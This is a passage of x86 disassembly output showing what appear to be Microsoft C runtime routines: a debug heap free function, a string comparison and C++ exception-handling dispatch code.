  4035d4:	83 3d 50 f2 45 00 02 	cmpl   $0x2,0x45f250
  4035db:	75 75                	jne    0x403652
  4035dd:	6a 09                	push   $0x9
  4035df:	e8 8c fe ff ff       	call   0x403470
  4035e4:	83 c4 04             	add    $0x4,%esp
  4035e7:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4035ee:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4035f1:	52                   	push   %edx
  4035f2:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4035f5:	50                   	push   %eax
  4035f6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4035f9:	51                   	push   %ecx
  4035fa:	e8 01 56 00 00       	call   0x408c00
  4035ff:	83 c4 0c             	add    $0xc,%esp
  403602:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403605:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  403609:	74 14                	je     0x40361f
  40360b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40360e:	52                   	push   %edx
  40360f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403612:	50                   	push   %eax
  403613:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403616:	51                   	push   %ecx
  403617:	e8 74 56 00 00       	call   0x408c90
  40361c:	83 c4 0c             	add    $0xc,%esp
  40361f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403626:	e8 02 00 00 00       	call   0x40362d
  40362b:	eb 0b                	jmp    0x403638
  40362d:	6a 09                	push   $0x9
  40362f:	e8 dc fe ff ff       	call   0x403510
  403634:	83 c4 04             	add    $0x4,%esp
  403637:	c3                   	ret
  403638:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40363c:	75 12                	jne    0x403650
  40363e:	8b 55 08             	mov    0x8(%ebp),%edx
  403641:	52                   	push   %edx
  403642:	6a 00                	push   $0x0
  403644:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  403649:	50                   	push   %eax
  40364a:	ff 15 40 f0 40 00    	call   *0x40f040
  403650:	eb 13                	jmp    0x403665
  403652:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403655:	51                   	push   %ecx
  403656:	6a 00                	push   $0x0
  403658:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  40365e:	52                   	push   %edx
  40365f:	ff 15 40 f0 40 00    	call   *0x40f040
  403665:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403668:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40366f:	5f                   	pop    %edi
  403670:	5e                   	pop    %esi
  403671:	5b                   	pop    %ebx
  403672:	8b e5                	mov    %ebp,%esp
  403674:	5d                   	pop    %ebp
  403675:	c3                   	ret
  403676:	cc                   	int3
  403677:	cc                   	int3
  403678:	cc                   	int3
  403679:	cc                   	int3
  40367a:	cc                   	int3
  40367b:	cc                   	int3
  40367c:	cc                   	int3
  40367d:	cc                   	int3
  40367e:	cc                   	int3
  40367f:	cc                   	int3
  403680:	55                   	push   %ebp
  403681:	8b ec                	mov    %esp,%ebp
  403683:	51                   	push   %ecx
  403684:	53                   	push   %ebx
  403685:	56                   	push   %esi
  403686:	57                   	push   %edi
  403687:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40368b:	75 05                	jne    0x403692
  40368d:	e9 88 00 00 00       	jmp    0x40371a
  403692:	6a 09                	push   $0x9
  403694:	e8 d7 fd ff ff       	call   0x403470
  403699:	83 c4 04             	add    $0x4,%esp
  40369c:	8b 45 08             	mov    0x8(%ebp),%eax
  40369f:	83 e8 20             	sub    $0x20,%eax
  4036a2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4036a5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4036a8:	8b 51 14             	mov    0x14(%ecx),%edx
  4036ab:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4036b1:	83 fa 04             	cmp    $0x4,%edx
  4036b4:	74 41                	je     0x4036f7
  4036b6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4036b9:	83 78 14 01          	cmpl   $0x1,0x14(%eax)
  4036bd:	74 38                	je     0x4036f7
  4036bf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4036c2:	8b 51 14             	mov    0x14(%ecx),%edx
  4036c5:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4036cb:	83 fa 02             	cmp    $0x2,%edx
  4036ce:	74 27                	je     0x4036f7
  4036d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4036d3:	83 78 14 03          	cmpl   $0x3,0x14(%eax)
  4036d7:	74 1e                	je     0x4036f7
  4036d9:	68 64 f1 40 00       	push   $0x40f164
  4036de:	6a 00                	push   $0x0
  4036e0:	6a 2f                	push   $0x2f
  4036e2:	68 58 f1 40 00       	push   $0x40f158
  4036e7:	6a 02                	push   $0x2
  4036e9:	e8 d2 5e 00 00       	call   0x4095c0
  4036ee:	83 c4 14             	add    $0x14,%esp
  4036f1:	83 f8 01             	cmp    $0x1,%eax
  4036f4:	75 01                	jne    0x4036f7
  4036f6:	cc                   	int3
  4036f7:	33 c9                	xor    %ecx,%ecx
  4036f9:	85 c9                	test   %ecx,%ecx
  4036fb:	75 a8                	jne    0x4036a5
  4036fd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403700:	8b 42 14             	mov    0x14(%edx),%eax
  403703:	50                   	push   %eax
  403704:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403707:	51                   	push   %ecx
  403708:	e8 23 2b 00 00       	call   0x406230
  40370d:	83 c4 08             	add    $0x8,%esp
  403710:	6a 09                	push   $0x9
  403712:	e8 f9 fd ff ff       	call   0x403510
  403717:	83 c4 04             	add    $0x4,%esp
  40371a:	5f                   	pop    %edi
  40371b:	5e                   	pop    %esi
  40371c:	5b                   	pop    %ebx
  40371d:	8b e5                	mov    %ebp,%esp
  40371f:	5d                   	pop    %ebp
  403720:	c3                   	ret
  403721:	cc                   	int3
  403722:	cc                   	int3
  403723:	cc                   	int3
  403724:	cc                   	int3
  403725:	cc                   	int3
  403726:	cc                   	int3
  403727:	cc                   	int3
  403728:	cc                   	int3
  403729:	cc                   	int3
  40372a:	cc                   	int3
  40372b:	cc                   	int3
  40372c:	cc                   	int3
  40372d:	cc                   	int3
  40372e:	cc                   	int3
  40372f:	cc                   	int3
  403730:	8b 54 24 04          	mov    0x4(%esp),%edx
  403734:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403738:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40373e:	75 3c                	jne    0x40377c
  403740:	8b 02                	mov    (%edx),%eax
  403742:	3a 01                	cmp    (%ecx),%al
  403744:	75 2e                	jne    0x403774
  403746:	0a c0                	or     %al,%al
  403748:	74 26                	je     0x403770
  40374a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40374d:	75 25                	jne    0x403774
  40374f:	0a e4                	or     %ah,%ah
  403751:	74 1d                	je     0x403770
  403753:	c1 e8 10             	shr    $0x10,%eax
  403756:	3a 41 02             	cmp    0x2(%ecx),%al
  403759:	75 19                	jne    0x403774
  40375b:	0a c0                	or     %al,%al
  40375d:	74 11                	je     0x403770
  40375f:	3a 61 03             	cmp    0x3(%ecx),%ah
  403762:	75 10                	jne    0x403774
  403764:	83 c1 04             	add    $0x4,%ecx
  403767:	83 c2 04             	add    $0x4,%edx
  40376a:	0a e4                	or     %ah,%ah
  40376c:	75 d2                	jne    0x403740
  40376e:	8b ff                	mov    %edi,%edi
  403770:	33 c0                	xor    %eax,%eax
  403772:	c3                   	ret
  403773:	90                   	nop
  403774:	1b c0                	sbb    %eax,%eax
  403776:	d1 e0                	shl    $1,%eax
  403778:	40                   	inc    %eax
  403779:	c3                   	ret
  40377a:	8b ff                	mov    %edi,%edi
  40377c:	f7 c2 01 00 00 00    	test   $0x1,%edx
  403782:	74 14                	je     0x403798
  403784:	8a 02                	mov    (%edx),%al
  403786:	42                   	inc    %edx
  403787:	3a 01                	cmp    (%ecx),%al
  403789:	75 e9                	jne    0x403774
  40378b:	41                   	inc    %ecx
  40378c:	0a c0                	or     %al,%al
  40378e:	74 e0                	je     0x403770
  403790:	f7 c2 02 00 00 00    	test   $0x2,%edx
  403796:	74 a8                	je     0x403740
  403798:	66 8b 02             	mov    (%edx),%ax
  40379b:	83 c2 02             	add    $0x2,%edx
  40379e:	3a 01                	cmp    (%ecx),%al
  4037a0:	75 d2                	jne    0x403774
  4037a2:	0a c0                	or     %al,%al
  4037a4:	74 ca                	je     0x403770
  4037a6:	3a 61 01             	cmp    0x1(%ecx),%ah
  4037a9:	75 c9                	jne    0x403774
  4037ab:	0a e4                	or     %ah,%ah
  4037ad:	74 c1                	je     0x403770
  4037af:	83 c1 02             	add    $0x2,%ecx
  4037b2:	eb 8c                	jmp    0x403740
  4037b4:	cc                   	int3
  4037b5:	cc                   	int3
  4037b6:	cc                   	int3
  4037b7:	cc                   	int3
  4037b8:	cc                   	int3
  4037b9:	cc                   	int3
  4037ba:	cc                   	int3
  4037bb:	cc                   	int3
  4037bc:	cc                   	int3
  4037bd:	cc                   	int3
  4037be:	cc                   	int3
  4037bf:	cc                   	int3
  4037c0:	55                   	push   %ebp
  4037c1:	8b ec                	mov    %esp,%ebp
  4037c3:	83 ec 08             	sub    $0x8,%esp
  4037c6:	8b 45 18             	mov    0x18(%ebp),%eax
  4037c9:	81 38 20 05 93 19    	cmpl   $0x19930520,(%eax)
  4037cf:	75 09                	jne    0x4037da
  4037d1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4037d8:	eb 08                	jmp    0x4037e2
  4037da:	e8 71 0e 00 00       	call   0x404650
  4037df:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4037e2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4037e5:	8b 51 04             	mov    0x4(%ecx),%edx
  4037e8:	83 e2 66             	and    $0x66,%edx
  4037eb:	85 d2                	test   %edx,%edx
  4037ed:	74 2f                	je     0x40381e
  4037ef:	8b 45 18             	mov    0x18(%ebp),%eax
  4037f2:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4037f6:	74 1c                	je     0x403814
  4037f8:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  4037fc:	75 16                	jne    0x403814
  4037fe:	6a ff                	push   $0xffffffff
  403800:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403803:	51                   	push   %ecx
  403804:	8b 55 14             	mov    0x14(%ebp),%edx
  403807:	52                   	push   %edx
  403808:	8b 45 0c             	mov    0xc(%ebp),%eax
  40380b:	50                   	push   %eax
  40380c:	e8 1f 05 00 00       	call   0x403d30
  403811:	83 c4 10             	add    $0x10,%esp
  403814:	b8 01 00 00 00       	mov    $0x1,%eax
  403819:	e9 8d 00 00 00       	jmp    0x4038ab
  40381e:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403821:	83 79 0c 00          	cmpl   $0x0,0xc(%ecx)
  403825:	74 7f                	je     0x4038a6
  403827:	8b 55 08             	mov    0x8(%ebp),%edx
  40382a:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  403830:	75 4c                	jne    0x40387e
  403832:	8b 45 08             	mov    0x8(%ebp),%eax
  403835:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40383c:	76 40                	jbe    0x40387e
  40383e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403841:	8b 51 1c             	mov    0x1c(%ecx),%edx
  403844:	8b 42 08             	mov    0x8(%edx),%eax
  403847:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40384a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40384e:	74 2e                	je     0x40387e
  403850:	8b 4d 24             	mov    0x24(%ebp),%ecx
  403853:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403859:	51                   	push   %ecx
  40385a:	8b 55 20             	mov    0x20(%ebp),%edx
  40385d:	52                   	push   %edx
  40385e:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403861:	50                   	push   %eax
  403862:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403865:	51                   	push   %ecx
  403866:	8b 55 14             	mov    0x14(%ebp),%edx
  403869:	52                   	push   %edx
  40386a:	8b 45 10             	mov    0x10(%ebp),%eax
  40386d:	50                   	push   %eax
  40386e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403871:	51                   	push   %ecx
  403872:	8b 55 08             	mov    0x8(%ebp),%edx
  403875:	52                   	push   %edx
  403876:	ff 55 fc             	call   *-0x4(%ebp)
  403879:	83 c4 20             	add    $0x20,%esp
  40387c:	eb 2d                	jmp    0x4038ab
  40387e:	8b 45 20             	mov    0x20(%ebp),%eax
  403881:	50                   	push   %eax
  403882:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  403885:	51                   	push   %ecx
  403886:	8a 55 24             	mov    0x24(%ebp),%dl
  403889:	52                   	push   %edx
  40388a:	8b 45 18             	mov    0x18(%ebp),%eax
  40388d:	50                   	push   %eax
  40388e:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403891:	51                   	push   %ecx
  403892:	8b 55 10             	mov    0x10(%ebp),%edx
  403895:	52                   	push   %edx
  403896:	8b 45 0c             	mov    0xc(%ebp),%eax
  403899:	50                   	push   %eax
  40389a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40389d:	51                   	push   %ecx
  40389e:	e8 0d 00 00 00       	call   0x4038b0
  4038a3:	83 c4 20             	add    $0x20,%esp
  4038a6:	b8 01 00 00 00       	mov    $0x1,%eax
  4038ab:	8b e5                	mov    %ebp,%esp
  4038ad:	5d                   	pop    %ebp
  4038ae:	c3                   	ret
  4038af:	cc                   	int3
  4038b0:	55                   	push   %ebp
  4038b1:	8b ec                	mov    %esp,%ebp
  4038b3:	83 ec 30             	sub    $0x30,%esp
  4038b6:	c6 45 f8 00          	movb   $0x0,-0x8(%ebp)
  4038ba:	8b 45 0c             	mov    0xc(%ebp),%eax
  4038bd:	8b 48 08             	mov    0x8(%eax),%ecx
  4038c0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4038c3:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  4038c7:	7c 14                	jl     0x4038dd
  4038c9:	8b 55 18             	mov    0x18(%ebp),%edx
  4038cc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4038cf:	3b 42 04             	cmp    0x4(%edx),%eax
  4038d2:	7d 09                	jge    0x4038dd
  4038d4:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4038db:	eb 08                	jmp    0x4038e5
  4038dd:	e8 6e 0d 00 00       	call   0x404650
  4038e2:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4038e5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4038e8:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  4038ee:	0f 85 b1 00 00 00    	jne    0x4039a5
  4038f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4038f7:	83 7a 10 03          	cmpl   $0x3,0x10(%edx)
  4038fb:	0f 85 a4 00 00 00    	jne    0x4039a5
  403901:	8b 45 08             	mov    0x8(%ebp),%eax
  403904:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40390b:	0f 85 94 00 00 00    	jne    0x4039a5
  403911:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403914:	83 79 1c 00          	cmpl   $0x0,0x1c(%ecx)
  403918:	0f 85 87 00 00 00    	jne    0x4039a5
  40391e:	e8 fd 0b 00 00       	call   0x404520
  403923:	83 78 6c 00          	cmpl   $0x0,0x6c(%eax)
  403927:	75 05                	jne    0x40392e
  403929:	e9 1e 02 00 00       	jmp    0x403b4c
  40392e:	e8 ed 0b 00 00       	call   0x404520
  403933:	8b 50 6c             	mov    0x6c(%eax),%edx
  403936:	89 55 08             	mov    %edx,0x8(%ebp)
  403939:	e8 e2 0b 00 00       	call   0x404520
  40393e:	8b 40 70             	mov    0x70(%eax),%eax
  403941:	89 45 10             	mov    %eax,0x10(%ebp)
  403944:	c6 45 f8 01          	movb   $0x1,-0x8(%ebp)
  403948:	6a 01                	push   $0x1
  40394a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40394d:	51                   	push   %ecx
  40394e:	e8 0d 63 00 00       	call   0x409c60
  403953:	83 c4 08             	add    $0x8,%esp
  403956:	85 c0                	test   %eax,%eax
  403958:	74 09                	je     0x403963
  40395a:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  403961:	eb 08                	jmp    0x40396b
  403963:	e8 e8 0c 00 00       	call   0x404650
  403968:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40396b:	8b 55 08             	mov    0x8(%ebp),%edx
  40396e:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  403974:	75 28                	jne    0x40399e
  403976:	8b 45 08             	mov    0x8(%ebp),%eax
  403979:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40397d:	75 1f                	jne    0x40399e
  40397f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403982:	81 79 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ecx)
  403989:	75 13                	jne    0x40399e
  40398b:	8b 55 08             	mov    0x8(%ebp),%edx
  40398e:	83 7a 1c 00          	cmpl   $0x0,0x1c(%edx)
  403992:	75 0a                	jne    0x40399e
  403994:	e8 b7 0c 00 00       	call   0x404650
  403999:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40399c:	eb 07                	jmp    0x4039a5
  40399e:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  4039a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4039a8:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4039ae:	0f 85 58 01 00 00    	jne    0x403b0c
  4039b4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4039b7:	83 79 10 03          	cmpl   $0x3,0x10(%ecx)
  4039bb:	0f 85 4b 01 00 00    	jne    0x403b0c
  4039c1:	8b 55 08             	mov    0x8(%ebp),%edx
  4039c4:	81 7a 14 20 05 93 19 	cmpl   $0x19930520,0x14(%edx)
  4039cb:	0f 85 3b 01 00 00    	jne    0x403b0c
  4039d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4039d4:	50                   	push   %eax
  4039d5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4039d8:	51                   	push   %ecx
  4039d9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4039dc:	52                   	push   %edx
  4039dd:	8b 45 20             	mov    0x20(%ebp),%eax
  4039e0:	50                   	push   %eax
  4039e1:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4039e4:	51                   	push   %ecx
  4039e5:	e8 06 f3 ff ff       	call   0x402cf0
  4039ea:	83 c4 14             	add    $0x14,%esp
  4039ed:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4039f0:	eb 12                	jmp    0x403a04
  4039f2:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4039f5:	83 c2 01             	add    $0x1,%edx
  4039f8:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4039fb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4039fe:	83 c0 14             	add    $0x14,%eax
  403a01:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403a04:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403a07:	3b 4d f4             	cmp    -0xc(%ebp),%ecx
  403a0a:	0f 83 df 00 00 00    	jae    0x403aef
  403a10:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403a13:	8b 02                	mov    (%edx),%eax
  403a15:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  403a18:	7f 0b                	jg     0x403a25
  403a1a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403a1d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403a20:	3b 51 04             	cmp    0x4(%ecx),%edx
  403a23:	7e 02                	jle    0x403a27
  403a25:	eb cb                	jmp    0x4039f2
  403a27:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403a2a:	8b 48 10             	mov    0x10(%eax),%ecx
  403a2d:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403a30:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403a33:	8b 42 0c             	mov    0xc(%edx),%eax
  403a36:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403a39:	eb 12                	jmp    0x403a4d
  403a3b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403a3e:	83 e9 01             	sub    $0x1,%ecx
  403a41:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  403a44:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403a47:	83 c2 10             	add    $0x10,%edx
  403a4a:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  403a4d:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  403a51:	0f 8e 93 00 00 00    	jle    0x403aea
  403a57:	8b 45 08             	mov    0x8(%ebp),%eax
  403a5a:	8b 48 1c             	mov    0x1c(%eax),%ecx
  403a5d:	8b 51 0c             	mov    0xc(%ecx),%edx
  403a60:	83 c2 04             	add    $0x4,%edx
  403a63:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403a66:	8b 45 08             	mov    0x8(%ebp),%eax
  403a69:	8b 48 1c             	mov    0x1c(%eax),%ecx
  403a6c:	8b 51 0c             	mov    0xc(%ecx),%edx
  403a6f:	8b 02                	mov    (%edx),%eax
  403a71:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403a74:	eb 12                	jmp    0x403a88
  403a76:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403a79:	83 e9 01             	sub    $0x1,%ecx
  403a7c:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403a7f:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403a82:	83 c2 04             	add    $0x4,%edx
  403a85:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403a88:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  403a8c:	7e 57                	jle    0x403ae5
  403a8e:	8b 45 08             	mov    0x8(%ebp),%eax
  403a91:	8b 48 1c             	mov    0x1c(%eax),%ecx
  403a94:	51                   	push   %ecx
  403a95:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403a98:	8b 02                	mov    (%edx),%eax
  403a9a:	50                   	push   %eax
  403a9b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403a9e:	51                   	push   %ecx
  403a9f:	e8 cc 01 00 00       	call   0x403c70
  403aa4:	83 c4 0c             	add    $0xc,%esp
  403aa7:	85 c0                	test   %eax,%eax
  403aa9:	75 02                	jne    0x403aad
  403aab:	eb c9                	jmp    0x403a76
  403aad:	8a 55 f8             	mov    -0x8(%ebp),%dl
  403ab0:	52                   	push   %edx
  403ab1:	8b 45 24             	mov    0x24(%ebp),%eax
  403ab4:	50                   	push   %eax
  403ab5:	8b 4d 20             	mov    0x20(%ebp),%ecx
  403ab8:	51                   	push   %ecx
  403ab9:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403abc:	52                   	push   %edx
  403abd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403ac0:	8b 08                	mov    (%eax),%ecx
  403ac2:	51                   	push   %ecx
  403ac3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403ac6:	52                   	push   %edx
  403ac7:	8b 45 18             	mov    0x18(%ebp),%eax
  403aca:	50                   	push   %eax
  403acb:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403ace:	51                   	push   %ecx
  403acf:	8b 55 10             	mov    0x10(%ebp),%edx
  403ad2:	52                   	push   %edx
  403ad3:	8b 45 0c             	mov    0xc(%ebp),%eax
  403ad6:	50                   	push   %eax
  403ad7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403ada:	51                   	push   %ecx
  403adb:	e8 80 03 00 00       	call   0x403e60
  403ae0:	83 c4 2c             	add    $0x2c,%esp
  403ae3:	eb 65                	jmp    0x403b4a
  403ae5:	e9 51 ff ff ff       	jmp    0x403a3b
  403aea:	e9 03 ff ff ff       	jmp    0x4039f2
  403aef:	8b 55 1c             	mov    0x1c(%ebp),%edx
  403af2:	81 e2 ff 00 00 00    	and    $0xff,%edx
  403af8:	85 d2                	test   %edx,%edx
  403afa:	74 0e                	je     0x403b0a
  403afc:	6a 01                	push   $0x1
  403afe:	8b 45 08             	mov    0x8(%ebp),%eax
  403b01:	50                   	push   %eax
  403b02:	e8 39 08 00 00       	call   0x404340
  403b07:	83 c4 08             	add    $0x8,%esp
  403b0a:	eb 3c                	jmp    0x403b48
  403b0c:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  403b0f:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403b15:	85 c9                	test   %ecx,%ecx
  403b17:	75 2a                	jne    0x403b43
  403b19:	8b 55 24             	mov    0x24(%ebp),%edx
  403b1c:	52                   	push   %edx
  403b1d:	8b 45 20             	mov    0x20(%ebp),%eax
  403b20:	50                   	push   %eax
  403b21:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403b24:	51                   	push   %ecx
  403b25:	8b 55 18             	mov    0x18(%ebp),%edx
  403b28:	52                   	push   %edx
  403b29:	8b 45 14             	mov    0x14(%ebp),%eax
  403b2c:	50                   	push   %eax
  403b2d:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403b30:	51                   	push   %ecx
  403b31:	8b 55 0c             	mov    0xc(%ebp),%edx
  403b34:	52                   	push   %edx
  403b35:	8b 45 08             	mov    0x8(%ebp),%eax
  403b38:	50                   	push   %eax
  403b39:	e8 12 00 00 00       	call   0x403b50
  403b3e:	83 c4 20             	add    $0x20,%esp
  403b41:	eb 05                	jmp    0x403b48
  403b43:	e8 78 0a 00 00       	call   0x4045c0
  403b48:	eb 02                	jmp    0x403b4c
  403b4a:	eb 9e                	jmp    0x403aea
  403b4c:	8b e5                	mov    %ebp,%esp
  403b4e:	5d                   	pop    %ebp
  403b4f:	c3                   	ret
  403b50:	55                   	push   %ebp
  403b51:	8b ec                	mov    %esp,%ebp
  403b53:	83 ec 0c             	sub    $0xc,%esp
  403b56:	e8 c5 09 00 00       	call   0x404520
  403b5b:	83 78 68 00          	cmpl   $0x0,0x68(%eax)
  403b5f:	74 2d                	je     0x403b8e
  403b61:	8b 45 24             	mov    0x24(%ebp),%eax
  403b64:	50                   	push   %eax
  403b65:	8b 4d 20             	mov    0x20(%ebp),%ecx
  403b68:	51                   	push   %ecx
  403b69:	8b 55 18             	mov    0x18(%ebp),%edx
  403b6c:	52                   	push   %edx
  403b6d:	8b 45 14             	mov    0x14(%ebp),%eax
  403b70:	50                   	push   %eax
  403b71:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403b74:	51                   	push   %ecx
  403b75:	8b 55 0c             	mov    0xc(%ebp),%edx
  403b78:	52                   	push   %edx
  403b79:	8b 45 08             	mov    0x8(%ebp),%eax
  403b7c:	50                   	push   %eax
  403b7d:	e8 0e f0 ff ff       	call   0x402b90
  403b82:	83 c4 1c             	add    $0x1c,%esp
  403b85:	85 c0                	test   %eax,%eax
  403b87:	74 05                	je     0x403b8e
  403b89:	e9 d3 00 00 00       	jmp    0x403c61
  403b8e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403b91:	51                   	push   %ecx
  403b92:	8d 55 f4             	lea    -0xc(%ebp),%edx
  403b95:	52                   	push   %edx
  403b96:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403b99:	50                   	push   %eax
  403b9a:	8b 4d 20             	mov    0x20(%ebp),%ecx
  403b9d:	51                   	push   %ecx
  403b9e:	8b 55 18             	mov    0x18(%ebp),%edx
  403ba1:	52                   	push   %edx
  403ba2:	e8 49 f1 ff ff       	call   0x402cf0
  403ba7:	83 c4 14             	add    $0x14,%esp
  403baa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403bad:	eb 12                	jmp    0x403bc1
  403baf:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403bb2:	83 c0 01             	add    $0x1,%eax
  403bb5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403bb8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403bbb:	83 c1 14             	add    $0x14,%ecx
  403bbe:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403bc1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403bc4:	3b 55 fc             	cmp    -0x4(%ebp),%edx
  403bc7:	0f 83 94 00 00 00    	jae    0x403c61
  403bcd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403bd0:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  403bd3:	3b 08                	cmp    (%eax),%ecx
  403bd5:	7c 42                	jl     0x403c19
  403bd7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403bda:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403bdd:	3b 42 04             	cmp    0x4(%edx),%eax
  403be0:	7f 37                	jg     0x403c19
  403be2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403be5:	8b 51 0c             	mov    0xc(%ecx),%edx
  403be8:	83 ea 01             	sub    $0x1,%edx
  403beb:	c1 e2 04             	shl    $0x4,%edx
  403bee:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403bf1:	8b 48 10             	mov    0x10(%eax),%ecx
  403bf4:	83 7c 11 04 00       	cmpl   $0x0,0x4(%ecx,%edx,1)
  403bf9:	74 20                	je     0x403c1b
  403bfb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403bfe:	8b 42 0c             	mov    0xc(%edx),%eax
  403c01:	83 e8 01             	sub    $0x1,%eax
  403c04:	c1 e0 04             	shl    $0x4,%eax
  403c07:	8b 4d f8             	mov    -0x8(%ebp),%ecx
